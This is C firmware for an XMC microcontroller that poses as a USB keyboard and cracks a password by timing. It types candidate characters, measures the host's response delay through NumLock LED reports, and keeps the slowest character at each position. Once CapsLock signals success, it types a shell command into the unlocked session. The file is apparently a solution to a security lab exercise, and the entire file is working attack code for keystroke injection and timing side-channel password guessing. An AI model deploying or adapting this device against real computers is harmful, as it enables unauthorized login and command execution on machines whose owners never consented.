
#include "KeyboardHID.h"
#include "german_keyboardCodes.h"

/* Macros: */
#define LED1 P1_1
#define LED2 P1_0


/* Clock configuration */
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

/* Forward declaration of HID callbacks as defined by LUFA */
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize );

void CALLBACK_HID_Device_ProcessHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							const uint8_t ReportID,
							const uint8_t ReportType,
							const void* ReportData,
							const uint16_t ReportSize );

void SystemCoreClockSetup(void);

/* SysTick Counter */
uint32_t volatile msTicks = 0;
uint32_t curTicks = 0;
int zwTicks[85] = {0};
void SysTick_Handler(void)
{
	msTicks++;
}

/* Password characters */
uint8_t success = 0;
uint8_t indexToSend_i = 0;
uint8_t indexToSend_j = 0;
uint8_t reset = 0;
int8_t indexlocal = 0;
uint8_t maxTime[20] = {0};
uint8_t pwToSend[85][20] = {0};
const uint8_t pwchars[85] = {

	GERMAN_KEYBOARD_SC_A,
        GERMAN_KEYBOARD_SC_B,
        GERMAN_KEYBOARD_SC_C,
        GERMAN_KEYBOARD_SC_D,
        GERMAN_KEYBOARD_SC_E,
        GERMAN_KEYBOARD_SC_F,
	GERMAN_KEYBOARD_SC_G,
	GERMAN_KEYBOARD_SC_H,
	GERMAN_KEYBOARD_SC_I,
	GERMAN_KEYBOARD_SC_J,
	GERMAN_KEYBOARD_SC_K,
	GERMAN_KEYBOARD_SC_L,
	GERMAN_KEYBOARD_SC_M,
	GERMAN_KEYBOARD_SC_N,
	GERMAN_KEYBOARD_SC_O,
	GERMAN_KEYBOARD_SC_P,
	GERMAN_KEYBOARD_SC_Q,
	GERMAN_KEYBOARD_SC_R,
	GERMAN_KEYBOARD_SC_S,
	GERMAN_KEYBOARD_SC_T,
	GERMAN_KEYBOARD_SC_U,
	GERMAN_KEYBOARD_SC_V,
	GERMAN_KEYBOARD_SC_W,
	GERMAN_KEYBOARD_SC_X,
	GERMAN_KEYBOARD_SC_Y,
	GERMAN_KEYBOARD_SC_Z,
	GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION,                 
        GERMAN_KEYBOARD_SC_2_AND_QUOTES,                  
        GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,               
        GERMAN_KEYBOARD_SC_4_AND_DOLLAR,                  
        GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE,              
        GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,                       
        GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,                   
        GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET, 
        GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET, 
        GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
        GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE,
	GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE,
	GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON,
	GERMAN_KEYBOARD_SC_DOT_AND_COLON,
	GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,
        GERMAN_KEYBOARD_SC_A,
        GERMAN_KEYBOARD_SC_B,
        GERMAN_KEYBOARD_SC_C,
        GERMAN_KEYBOARD_SC_D,
        GERMAN_KEYBOARD_SC_E,
        GERMAN_KEYBOARD_SC_F,
        GERMAN_KEYBOARD_SC_G,
        GERMAN_KEYBOARD_SC_H,
        GERMAN_KEYBOARD_SC_I,
        GERMAN_KEYBOARD_SC_J,
        GERMAN_KEYBOARD_SC_K,
        GERMAN_KEYBOARD_SC_L,
        GERMAN_KEYBOARD_SC_M,
        GERMAN_KEYBOARD_SC_N,
        GERMAN_KEYBOARD_SC_O,
        GERMAN_KEYBOARD_SC_P,
        GERMAN_KEYBOARD_SC_Q,
        GERMAN_KEYBOARD_SC_R,
        GERMAN_KEYBOARD_SC_S,
        GERMAN_KEYBOARD_SC_T,
        GERMAN_KEYBOARD_SC_U,
        GERMAN_KEYBOARD_SC_V,
        GERMAN_KEYBOARD_SC_W,
        GERMAN_KEYBOARD_SC_X,
        GERMAN_KEYBOARD_SC_Y,
        GERMAN_KEYBOARD_SC_Z,
	GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION,                
        GERMAN_KEYBOARD_SC_2_AND_QUOTES,                              
        GERMAN_KEYBOARD_SC_4_AND_DOLLAR,                              
        GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,                      
        GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,                  
        GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET,
        GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,
        GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
     	GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH,
	GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE,
	GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON,
	GERMAN_KEYBOARD_SC_DOT_AND_COLON,
	GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,
	GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,
        GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET,
        GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,
        GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
	GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE

        };

/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void) {
	// Init LED pins for debugging and NUM/CAPS visual report
	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	USB_Init();
	
	// Init SysTick
	SysTick_Config(SystemCoreClock / 1000);

		
	// Wait until host has enumerated HID device
	for(int i = 0; i < 10e6; ++i)
		; 

	// pwToSend
	for(int j = 0; j < 20; j++) {
        	for(int i = 0; i < 85; i++) {
                        pwToSend[i][j] = pwchars[i];
                }
	}

	while (1) {
		HID_Device_USBTask(&Keyboard_HID_Interface);
	} 
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize ) {
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t); 

	if(success == 0) {
		if(indexToSend_i < 85) {
			if(reset) {

				report->Modifier = 0;
				report->Reserved = 0;
				report->KeyCode[0] = 0;
				reset = 0;
				++indexlocal;

			} else {
				
				if(indexlocal < indexToSend_j) {
					if(maxTime[indexlocal] < 41) {
                                		report->Modifier = 0;
                        		} else if(maxTime[indexlocal] >= 41 && maxTime[indexlocal] <= 79) {
                                		report->Modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
                        		} else {
                                		report->Modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
                        		}

					report->Reserved = 0;
					report->KeyCode[0] = pwToSend[maxTime[indexlocal]][indexlocal];

				} else if(indexlocal == indexToSend_j) {
					if(indexToSend_i < 41) {
                                		report->Modifier = 0;
                        		} else if(indexToSend_i >= 41 && indexToSend_i <= 79) {
                                		report->Modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
                        		} else {
                                		report->Modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
                        		}

			 		report->Reserved = 0;
                                	report->KeyCode[0] = pwToSend[indexToSend_i][indexlocal];
				} else {
					report->Modifier = 0;
					report->Reserved = 0;
					int32_t waiter = 0;
                                        while(waiter < (1<<22)) {
                                                waiter++;
                                        }
					curTicks = msTicks;
					report->KeyCode[0] = GERMAN_KEYBOARD_SC_ENTER;
					++indexToSend_i;
					indexlocal = -1;
				}

				reset = 1;
			}
		}
		else {
			++indexToSend_j;
			indexToSend_i = 0;
			reset = 0;
			indexlocal = 0;
			for(int i = 0; i < 85; i++) {
				zwTicks[i] = 0;
			}
		}
	} else {
		static uint8_t stringToSend[42] = {
			
			GERMAN_KEYBOARD_SC_C,
			GERMAN_KEYBOARD_SC_D,
			GERMAN_KEYBOARD_SC_SPACE,
			GERMAN_KEYBOARD_SC_4_AND_DOLLAR,
			GERMAN_KEYBOARD_SC_H, //4
			GERMAN_KEYBOARD_SC_O,
			GERMAN_KEYBOARD_SC_M,
			GERMAN_KEYBOARD_SC_E, //7
			GERMAN_KEYBOARD_SC_SPACE,
			GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,
			GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,
			GERMAN_KEYBOARD_SC_SPACE,
			GERMAN_KEYBOARD_SC_E,
			GERMAN_KEYBOARD_SC_C,
			GERMAN_KEYBOARD_SC_H,
			GERMAN_KEYBOARD_SC_O,
			GERMAN_KEYBOARD_SC_SPACE,
			GERMAN_KEYBOARD_SC_2_AND_QUOTES,
			GERMAN_KEYBOARD_SC_Y,//18
                        GERMAN_KEYBOARD_SC_I,
                        GERMAN_KEYBOARD_SC_P,
                        GERMAN_KEYBOARD_SC_E,
                        GERMAN_KEYBOARD_SC_N,
                        GERMAN_KEYBOARD_SC_G,
                        GERMAN_KEYBOARD_SC_SPACE,
                        GERMAN_KEYBOARD_SC_Z,//25
                        GERMAN_KEYBOARD_SC_H,
                        GERMAN_KEYBOARD_SC_O,
                        GERMAN_KEYBOARD_SC_U,
			GERMAN_KEYBOARD_SC_2_AND_QUOTES,
			GERMAN_KEYBOARD_SC_SPACE,
			GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,
			GERMAN_KEYBOARD_SC_SPACE,
			GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, //33  
  			GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,
                        GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,
                        GERMAN_KEYBOARD_SC_4_AND_DOLLAR,
                        GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,
                        GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION,
                        GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION,
                        GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION, //40
			GERMAN_KEYBOARD_SC_ENTER

		};

		if(indexlocal < 42) {
			if(reset) {
				report->Modifier = 0; 
				report->Reserved = 0; 
				report->KeyCode[0] = 0; 
				reset = 0;
				++indexlocal;
			} else {

				int32_t waiter = 0;
                                while(waiter < (1<<22)) {
                                        waiter++;
                                }
				
				if((indexlocal >= 4 && indexlocal <= 7) || (indexlocal == 18) || (indexlocal == 25) || (indexlocal >= 33 && indexlocal <= 40)) {
				       report->Modifier = 0;
				} else {		
					report->Modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
				}
				report->Reserved = 0;
				report->KeyCode[0] = stringToSend[indexlocal];
				reset = 1;
			}
		}
	}


	return true;
}

// Called on report input. For keyboard HID devices, that's the state of the LEDs
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
	uint8_t *report = (uint8_t*)ReportData;

	if(*report & HID_KEYBOARD_LED_NUMLOCK) { 	
		XMC_GPIO_SetOutputHigh(LED1);
		if(indexToSend_i > 0) {
			zwTicks[indexToSend_i - 1] = msTicks - curTicks;
			if(zwTicks[maxTime[indexToSend_j]] < zwTicks[indexToSend_i - 1]) {
				maxTime[indexToSend_j] = indexToSend_i - 1;	
			}
		}
	}		
	else 
		XMC_GPIO_SetOutputLow(LED1);

	if(*report & HID_KEYBOARD_LED_CAPSLOCK) {
		success = 1;
		reset = 0;
		indexlocal = 0;
		XMC_GPIO_SetOutputHigh(LED2);
	}
	else 
		XMC_GPIO_SetOutputLow(LED2);
}

void SystemCoreClockSetup(void) {
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);

	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	SystemCoreClockUpdate();
}
